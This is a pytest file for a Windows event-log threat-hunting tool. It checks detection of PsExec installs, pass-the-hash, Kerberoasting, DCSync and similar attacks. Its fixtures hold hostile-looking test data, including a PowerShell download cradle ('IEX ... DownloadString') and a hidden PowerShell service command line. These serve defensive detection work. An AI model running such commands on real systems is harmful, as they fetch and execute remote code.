import itertools
from datetime import datetime, timedelta, timezone

from crabwalk.catalog import POWERSHELL, SECURITY, SYSMON, SYSTEM, TS_LSM, WINRM
from crabwalk.models import NormalizedEvent
from crabwalk.rules import HuntContext, hunt, run_rules

T0 = datetime(2026, 8, 1, 12, 0, 0, tzinfo=timezone.utc)
_rid = itertools.count(1)  # EventRecordID is unique per event in real data


def ev(event_id, *, minutes=0, computer="SRV01", channel=SECURITY, record_id=None, **data):
    return NormalizedEvent(
        timestamp=T0 + timedelta(minutes=minutes),
        channel=channel,
        provider="test",
        event_id=event_id,
        record_id=record_id if record_id is not None else next(_rid),
        computer=computer,
        data=data,
        source_file="test.evtx",
    )


def remote_logon(logon_id="0x3E7A", minutes=0, computer="SRV01", user="admin", **extra):
    data = {
        "TargetLogonId": logon_id,
        "TargetUserName": user,
        "TargetDomainName": "CORP",
        "LogonType": "3",
        "IpAddress": "10.0.0.5",
        "WorkstationName": "WS01",
        "AuthenticationPackageName": "Kerberos",
    }
    data.update(extra)
    return ev(4624, minutes=minutes, computer=computer, **data)


def findings_for(*events):
    return run_rules(HuntContext.build(list(events)))


def by_rule(findings, rule_id):
    return [f for f in findings if f.rule_id == rule_id]


def test_psexec_pattern_detected_and_known_tool_is_critical():
    findings = by_rule(
        findings_for(
            remote_logon(),
            ev(7045, channel=SYSTEM, minutes=2, ServiceName="PSEXESVC",
               ImagePath=r"%SystemRoot%\PSEXESVC.exe"),
        ),
        "CW-001",
    )
    (finding,) = findings
    assert finding.severity == "critical"
    assert "PSEXESVC" in finding.summary
    assert finding.user == "CORP\\admin"


def sysmon_image_path(service, image, *, minutes=0, computer="SRV01"):
    return ev(13, channel=SYSMON, minutes=minutes, computer=computer,
              Image=r"C:\Windows\system32\services.exe",
              TargetObject=rf"HKLM\System\CurrentControlSet\Services\{service}\ImagePath",
              Details=image)


def test_one_install_seen_by_7045_and_sysmon_13_is_one_finding():
    events = [
        remote_logon(),
        sysmon_image_path("PSEXESVC", r"%%SystemRoot%%\PSEXESVC.exe", minutes=1.999),
        ev(7045, channel=SYSTEM, minutes=2, ServiceName="PSEXESVC",
           ImagePath=r"%SystemRoot%\PSEXESVC.exe"),
    ]
    ctx = HuntContext.build(events)
    (install,) = ctx.service_installs
    assert install.source == "7045"
    assert len(by_rule(run_rules(ctx), "CW-001")) == 1


def test_sysmon_13_rewrite_of_an_existing_service_is_not_an_install():
    # Defender platform updates rewrite WinDefend's ImagePath all the time.
    image = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"
    findings = findings_for(remote_logon(), sysmon_image_path("WinDefend", image, minutes=3))
    assert by_rule(findings, "CW-001") == []


def test_sysmon_13_counts_when_it_looks_like_remote_exec():
    command = r"%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c ..."
    (finding,) = by_rule(findings_for(remote_logon(), sysmon_image_path("hello", command, minutes=1)),
                         "CW-001")
    assert "ImagePath of service 'hello' set to" in finding.summary
    # An unrelated 7045 elsewhere on the host does not prove this install's
    # 7045 was logged (the System log may have been cleared): it still counts.
    with_other_scm = findings_for(
        remote_logon(), sysmon_image_path("hello", command, minutes=1),
        ev(7045, channel=SYSTEM, minutes=9, ServiceName="Other", ImagePath=r"C:\o.exe"),
    )
    assert any("hello" in f.summary for f in by_rule(with_other_scm, "CW-001"))


def test_two_real_installs_of_one_service_are_not_merged():
    events = [
        remote_logon(),
        ev(7045, channel=SYSTEM, minutes=1, ServiceName="PSEXESVC", ImagePath=r"C:\p.exe"),
        remote_logon(logon_id="0x99", user="eve", IpAddress="10.0.0.9", WorkstationName="WS09",
                     minutes=1.03),
        ev(7045, channel=SYSTEM, minutes=1.1, ServiceName="PSEXESVC", ImagePath=r"C:\p.exe"),
    ]
    ctx = HuntContext.build(events)
    assert [i.source for i in ctx.service_installs] == ["7045", "7045"]
    assert len(by_rule(run_rules(ctx), "CW-001")) == 2


def test_copies_of_one_install_merge_even_across_an_earlier_write():
    # Sysmon 13 at :50, 4697 at :59.98, 7045 at :60.02 — one install, one finding.
    events = [
        remote_logon(),
        sysmon_image_path("PSEXESVC", r"%SystemRoot%\PSEXESVC.exe", minutes=50 / 60),
        ev(4697, channel=SECURITY, minutes=59.98 / 60, ServiceName="PSEXESVC",
           ServiceFileName=r"%SystemRoot%\PSEXESVC.exe"),
        ev(7045, channel=SYSTEM, minutes=60.02 / 60, ServiceName="PSEXESVC",
           ImagePath=r"%SystemRoot%\PSEXESVC.exe"),
    ]
    ctx = HuntContext.build(events)
    assert [i.source for i in ctx.service_installs] == ["7045"]
    assert len(by_rule(run_rules(ctx), "CW-001")) == 1


def test_service_install_without_remote_logon_is_quiet():
    findings = findings_for(
        ev(7045, channel=SYSTEM, ServiceName="GoodDriver", ImagePath=r"C:\ok.sys")
    )
    assert by_rule(findings, "CW-001") == []


def test_service_install_outside_window_is_quiet():
    findings = findings_for(
        remote_logon(),
        ev(7045, channel=SYSTEM, minutes=30, ServiceName="Svc", ImagePath=r"C:\x.exe"),
    )
    assert by_rule(findings, "CW-001") == []


def test_rdp_chain_across_three_hosts():
    hop1 = ev(21, channel=TS_LSM, computer="HOSTB", minutes=0,
              User="CORP\\bob", Address="10.1.1.1")
    hop2 = remote_logon(
        computer="HOSTC", minutes=45, user="bob", logon_id="0x77",
        LogonType="10", IpAddress="10.2.2.2", WorkstationName="HOSTB",
    )
    (finding,) = by_rule(findings_for(hop1, hop2), "CW-002")
    assert finding.host == "HOSTC"
    assert "RDP chain" in finding.summary
    assert "HOSTB" in finding.summary


def test_pth_seclogo_logon_type_9():
    event = ev(
        4624, TargetUserName="victim", LogonType="9",
        LogonProcessName="seclogo", AuthenticationPackageName="Negotiate",
        TargetLogonId="0x99", TargetOutboundUserName="DA-admin",
    )
    (finding,) = by_rule(findings_for(event), "CW-003")
    assert finding.severity == "high"
    assert "DA-admin" in finding.summary


def test_pth_privileged_ntlm_needs_4672():
    logon = remote_logon(AuthenticationPackageName="NTLM")
    assert by_rule(findings_for(logon), "CW-003") == []
    privileges = ev(4672, SubjectLogonId="0x3E7A")
    (finding,) = by_rule(findings_for(logon, privileges), "CW-003")
    assert finding.severity == "medium"


def test_remote_scheduled_task():
    task = ev(
        4698, minutes=1, SubjectLogonId="0x3E7A", TaskName=r"\Microsoft\evil",
        TaskContent="<Task><Exec><Command>C:\\payload.exe</Command></Exec></Task>",
    )
    (finding,) = by_rule(findings_for(remote_logon(), task), "CW-004")
    assert "payload.exe" in finding.summary
    assert finding.user == "CORP\\admin"


def test_local_scheduled_task_is_quiet():
    local = remote_logon(IpAddress="-", WorkstationName="-")
    task = ev(4698, minutes=1, SubjectLogonId="0x3E7A", TaskName=r"\backup")
    assert by_rule(findings_for(local, task), "CW-004") == []


def test_admin_share_executable_deduplicates():
    events = [
        ev(5145, record_id=i, ShareName=r"\\*\ADMIN$", RelativeTargetName="evil.exe",
           SubjectUserName="admin", IpAddress="10.0.0.5")
        for i in (1, 2)
    ]
    findings = by_rule(findings_for(*events), "CW-005")
    assert len(findings) == 1
    assert "evil.exe" in findings[0].summary


def test_wmi_spawned_shell_is_high():
    event = ev(
        1, channel=SYSMON, Image=r"C:\Windows\System32\cmd.exe",
        ParentImage=r"C:\Windows\System32\wbem\WmiPrvSE.exe",
        CommandLine="cmd.exe /c whoami", User="CORP\\admin",
    )
    (finding,) = by_rule(findings_for(event), "CW-006")
    assert finding.severity == "high"
    assert "whoami" in finding.summary


def test_winrm_shell_event():
    (finding,) = by_rule(findings_for(ev(91, channel=WINRM)), "CW-007")
    assert finding.techniques == ("T1021.006",)


def test_suspicious_powershell_download_cradle():
    event = ev(
        4104, channel=POWERSHELL,
        ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x/a')",
    )
    (finding,) = by_rule(findings_for(event), "CW-008")
    assert finding.severity == "high"
    assert "download cradle" in finding.summary


def test_benign_powershell_is_quiet():
    event = ev(4104, channel=POWERSHELL, ScriptBlockText="Get-ChildItem C:\\")
    assert by_rule(findings_for(event), "CW-008") == []


def test_kerberoasting_rc4_ticket():
    event = ev(
        4769, TargetUserName="attacker@CORP.LOCAL", TargetDomainName="CORP.LOCAL",
        ServiceName="svc_sql", TicketEncryptionType="0x17", Status="0x0",
        IpAddress="10.0.0.9",
    )
    (finding,) = by_rule(findings_for(event), "CW-010")
    assert finding.severity == "high"
    assert "svc_sql" in finding.summary
    assert finding.techniques == ("T1558.003",)


def test_kerberoasting_ignores_aes_and_machine_accounts():
    aes = ev(4769, TargetUserName="u", ServiceName="svc", TicketEncryptionType="0x12")
    machine = ev(4769, TargetUserName="u", ServiceName="HOST$", TicketEncryptionType="0x17")
    assert by_rule(findings_for(aes, machine), "CW-010") == []


def test_kerberoasting_ignores_machine_requesters_in_upn_form():
    event = ev(4769, TargetUserName="WS01$@CORP.LOCAL", ServiceName="svc_sql",
               TicketEncryptionType="0x17", Status="0x0")
    assert by_rule(findings_for(event), "CW-010") == []


def test_dcsync_by_non_dc_principal_is_critical():
    event = ev(
        4662, SubjectUserName="Administrator", SubjectDomainName="CORP",
        Properties="%%7688 {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0}",
    )
    (finding,) = by_rule(findings_for(event), "CW-011")
    assert finding.severity == "critical"
    assert finding.user == "CORP\\Administrator"
    assert finding.techniques == ("T1003.006",)


def test_dcsync_ignores_domain_controller_machine_account():
    # DCs replicate legitimately and authenticate as machine accounts.
    event = ev(
        4662, SubjectUserName="DC1$", SubjectDomainName="CORP",
        Properties="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
    )
    assert by_rule(findings_for(event), "CW-011") == []


def test_dcsync_ignores_non_replication_object_access():
    event = ev(4662, SubjectUserName="Administrator", Properties="{some-other-guid}")
    assert by_rule(findings_for(event), "CW-011") == []


def test_log_cleared_and_dedup():
    events = [
        ev(1102, SubjectUserName="admin", SubjectDomainName="CORP"),
        ev(1102, SubjectUserName="admin", SubjectDomainName="CORP"),  # duplicate export
    ]
    findings = by_rule(findings_for(*events), "CW-009")
    assert len(findings) == 1
    assert findings[0].user == "CORP\\admin"


def test_findings_sorted_worst_first():
    ctx, findings = hunt(
        [
            ev(4104, channel=POWERSHELL, ScriptBlockText="$x = [Convert]::FromBase64String($y)"),
            remote_logon(),
            ev(7045, channel=SYSTEM, minutes=2, ServiceName="PSEXESVC", ImagePath=r"C:\p.exe"),
        ]
    )
    assert [f.rule_id for f in findings][0] == "CW-001"  # critical first
    assert findings[0].severity == "critical"
